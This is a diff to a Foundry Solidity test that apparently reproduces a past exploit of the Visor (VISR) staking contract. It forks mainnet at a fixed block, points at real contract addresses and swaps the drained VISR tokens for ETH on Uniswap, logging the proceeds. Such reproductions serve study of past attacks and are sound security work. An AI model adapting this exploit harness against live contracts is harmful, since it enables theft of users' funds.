@@ -16,6 +16,9 @@ contract VisrExploitTest is Test {
 
     // setup function runs before tests begin
     function setUp() public {
+        // Change to the point in time of the exploit
+        vm.rollFork(13848982);
+
         // The address of the deployed visrStaking contract
         visrContract = VisrInterface(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);
         uniswapContract = UniswapV2Interface(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
@@ -47,6 +50,8 @@ contract VisrExploitTest is Test {
         // Execute Swap
         uint256[] memory amounts =
             uniswapContract.swapExactTokensForETH(visrToken.balanceOf(address(0x7)), 0, path, address(0x7), 2650097619);
-        console.log("ETH BALANCE AFTER HACK: ", address(0x7).balance);
+        uint visrTokensTraded = amounts[0] / 1e18;
+        uint ethTokensReceived = amounts[1] / 1e18;
+        console.log("Visr amount traded:", visrTokensTraded, "for value of ETH", ethTokensReceived);
     }
 }
